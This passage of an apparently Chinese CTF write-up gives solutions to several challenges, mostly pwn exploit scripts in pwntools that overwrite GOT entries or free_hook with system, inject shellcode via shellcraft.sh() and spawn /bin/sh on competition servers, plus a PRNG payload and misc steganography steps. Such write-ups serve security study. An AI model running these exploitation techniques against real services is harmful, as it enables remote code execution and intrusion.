<span class="k">for</span> <span class="n">matchNum</span><span class="p">,</span> <span class="n">match</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">matches</span><span class="p">,</span> <span class="n">start</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">solve_pow</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">)))</span>
    <span class="k">print</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>

<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'opcode(hex):'</span><span class="p">))</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'030401130005330239'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
</pre></div>
<h3 data-content="1" id="e46b884f8b9ed2a10507f21b6dee3676">babyprng2</h3>
<p>与第一题类似. 多了一个队列, 并且每次保存都会出栈, 不能像第一题无脑循环.<br/>
按 题1 思路, 依然是需要一个 1.<br/>
有以下循环</p>
<pre><code>| 1 ? =&gt; 1 1
两次后可以得到 1 1 1
1 1 1 出 1
| 1 1 =&gt; 1 0 出 0
1 跳到第一步</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190429184509-dbbc09e8-6a6b-1.png"/></p>
<p>最后payload为</p>
<pre><code>01111206350606080306013606060803000400053a</code></pre>
<h2 data-content="1" id="87373e2ea7c05aebf0b815ad84b4d345">Misc</h2>
<h3 data-content="1" id="2e0fbeb4f18f451e9153a01c44d01406">She</h3>
<p>使用cheat engine工具<br/>
修改存档打败boss后</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190429184523-e4234d58-6a6b-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190429184526-e6147eac-6a6b-1.png"/></p>
<p>9个房间每次开一个只能打开一个门，有一个bad door在touch后不能打开其他门，经测试在3号门得到数字3，在8号门得到数字7，在2号门得到数字1，在1号门得到数字2，在5号门得到数字6，在7号门得到数字9，9号门是bad door。剩下两个门打不开。得到六个数字后可进入一个房间，找到镜子。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190429184530-e86e52f4-6a6b-1.png"/><br/>
人在镜子右边，说的是md5 decrypt<br/>
后来发现人站在镜子左边<br/>
镜子说的话又变了</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190429184540-ee37848a-6a6b-1.png"/><br/>
猜测右边的是迷惑人的。<br/>
按得到的数字371269加密后发现不对，根据题目提示，Please combine numbers in the order of the rooms，改为213697进行md5加密，得到flag.</p>
<h3 data-content="1" id="901e45b2088032365470e50a06e8054c">otaku</h3>
<p>ichunqiu级别，无语凝噎。<br/>
<code>binwalk -e</code>直接解zip，把doc转docx接着解压提取出里面的隐藏字符，用GBK保存到文本文件。之后已知明文攻击提取密码My_Waifu，最后LSB隐写。</p>
<h2 data-content="1" id="855a01e405fe22c01a8b6eac26575874">pwn</h2>
<h3 data-content="1" id="c9ca7d776c35985b3ef8666386b62c18">quick sort</h3>
<h4 data-content="1" id="8fdafcddcad7a3840ecfa99f1c833065">利用思路：</h4>
<p>gets覆盖ptr，导致任意写，修改free@got为main，将ptr修改为可泄露地址进行泄露，再次执行劫持<code>atoi@got</code>为<code>system</code></p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="c1"># gdb.attach(p,"b *0x080488ED")</span>
    <span class="c1"># set free --&gt; main</span>
    <span class="n">got_free</span> <span class="o">=</span> <span class="mh">0x804a018</span>
    <span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x80489C9</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">got_free</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"how many numbers do you want to sort?"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"the 1th number:"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

    <span class="c1">#leak libc</span>
    <span class="n">stderr</span> <span class="o">=</span> <span class="mh">0x804a060</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"how many numbers do you want to sort?"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"2"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"the 1th number:"</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s2">"-"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x7fffffff</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">stderr</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"the 2th number:"</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s2">"0"</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">stderr</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Here is the result:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">" "</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span><span class="o">+</span><span class="mh">0x100000000</span><span class="o">-</span><span class="mh">0x1b2cc0</span>
    <span class="n">info</span><span class="p">(</span><span class="s2">"libc : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>

    <span class="c1">#atoi --&gt; system</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"how many numbers do you want to sort?"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"the 1th number:"</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">"system"</span><span class="p">]</span><span class="o">+</span><span class="n">libc_base</span><span class="o">-</span><span class="mh">0x100000000</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">"atoi"</span><span class="p">])</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"how many numbers do you want to sort?"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"the 1th number:"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"/bin/sh"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
    <span class="c1"># p = process("./quicksort",env={"LD_PRELOAD":"./libc.so.6"})</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"34.92.96.238"</span><span class="p">,</span><span class="s2">"10000"</span><span class="p">)</span>
    <span class="c1"># p = process("./quicksort")</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./quicksort"</span><span class="p">)</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./libc.so.6"</span><span class="p">)</span>
    <span class="n">main</span><span class="p">()</span>
</pre></div>
<h3 data-content="1" id="61656c8bd31af147220838e36fcb72a3">grilfriend</h3>
<div class="highlight"><pre><span></span><span class="c1">#coding:utf-8</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1"># context.log_level = 'debug'</span>
<span class="n">local</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">libc_path</span> <span class="o">=</span> <span class="s2">"./lib/libc.so.6"</span>
<span class="k">if</span> <span class="n">local</span><span class="p">:</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./chall_patch"</span><span class="p">,</span><span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s2">"LD_PRELOAD"</span><span class="p">:</span><span class="n">libc_path</span><span class="p">})</span>
    <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">"./chall_patch"</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"34.92.96.238"</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">new</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"Input your choice:"</span><span class="p">,</span><span class="s1">'1'</span><span class="p">)</span>

    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"name</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"name:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"call:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'0'</span><span class="o">*</span><span class="mi">11</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"choice:"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'2'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"index:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"choice:"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'4'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"index:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="n">chunk_list</span> <span class="o">=</span> <span class="mh">0x202060</span>
<span class="n">new</span><span class="p">(</span><span class="mh">0x500</span><span class="p">,</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">new</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">'b'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">new</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">'b'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">new</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">'b'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">new</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">'b'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"phone:"</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)[</span><span class="o">-</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x3b1ca0</span>
<span class="n">success</span><span class="p">(</span><span class="s2">"libc_base-&gt;{:#x}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

<span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"phone:"</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)[</span><span class="o">-</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x7b0</span>
<span class="n">success</span><span class="p">(</span><span class="s2">"heap_base-&gt;{:#x}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
    <span class="n">new</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">'a'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
    <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
<span class="c1">#-------------</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">new</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>


<span class="n">new</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x3b38c8</span><span class="p">))</span>  <span class="c1">##free_hook</span>
<span class="n">new</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s2">"/bin/sh</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>
<span class="n">new</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x41c30</span><span class="p">))</span>  <span class="c1">## system</span>
<span class="c1"># gdb.attach(p,'''b malloc\nb free\nb* $0xF87''')</span>
<span class="n">new</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x41c30</span><span class="p">))</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">13</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h3 data-content="1" id="5d170db49eae6ce68da9487d12cd1ab0">upxofcpp</h3>
<p><strong>思路</strong><br/>
upx加壳，主程序空间可读可写可执行<br/>
free的时候没有清空指针<br/>
node结构体中存在指向函数调用的<em>func_table,通过构造使得</em>func_table指到堆，使得*func_table的show函数指向堆上，在show函数指向的堆上构造shellcode</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">)</span>

<span class="c1"># p = process('./upxofcpp',env = {'LD_PRELOAD':'./libc-2.23.so'})</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'34.92.121.149'</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">new</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">intg</span><span class="p">):</span>
    <span class="n">string</span> <span class="o">=</span> <span class="s1">''</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Your choice:'</span><span class="p">,</span><span class="s1">'1'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Index:'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Size:'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
        <span class="n">string</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">intg</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span>
    <span class="k">print</span> <span class="n">string</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">'Input '</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">+</span><span class="s1">' integers, -1 to stop:'</span><span class="p">,</span><span class="n">string</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Your choice:'</span><span class="p">,</span><span class="s1">'2'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'vec index:'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Your choice:'</span><span class="p">,</span><span class="s1">'4'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'index:'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Your choice:'</span><span class="p">,</span><span class="s1">'1'</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Index:'</span><span class="p">,</span><span class="s1">'1'</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Size:'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
<span class="sd">'''</span>
<span class="sd">push rax</span>
<span class="sd">pop rsi</span>
<span class="sd">push rcx</span>
<span class="sd">push rcx</span>
<span class="sd">pop rax</span>
<span class="sd">pop rdi</span>
<span class="sd">syscall</span>
<span class="sd">'''</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">'0</span><span class="se">\n</span><span class="s1">'</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0x51515e50</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0x53415f58</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0x00050f5a</span><span class="p">)</span> <span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0xdead</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">'Input 6 integers, -1 to stop:'</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="n">new</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">new</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="c1"># gdb.attach(p,'c\n')</span>
<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">'</span><span class="se">\x90</span><span class="s1">'</span><span class="o">*</span><span class="mh">0x90</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">()))</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h3 data-content="1" id="e71e6b6fd3a27fcd57684cf3a175c2d5">heap_master</h3>
<p><strong>注意</strong></p>
<ul>
<li>libc是2.25的</li>
<li>远程没有bin目录，只能在程序内orw</li>
</ul>
<p><strong>利用思路</strong><br/>
large bin attack 修改<code>_IO_2_1_stdout_</code>，导致泄露，之后再次large bin attack修改<code>_IO_list_all</code>获得一次任意地址call，从而将栈迁移到mmap的内存上，执行事先布置的ropchain</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">g</span><span class="p">(</span><span class="n">off</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">off</span>

<span class="k">def</span> <span class="nf">_add</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'&gt;&gt; '</span><span class="p">,</span> <span class="s1">'1'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'size: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">_edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">cont</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'&gt;&gt; '</span><span class="p">,</span> <span class="s1">'2'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'offset: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">off</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'size: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">cont</span><span class="p">)))</span>
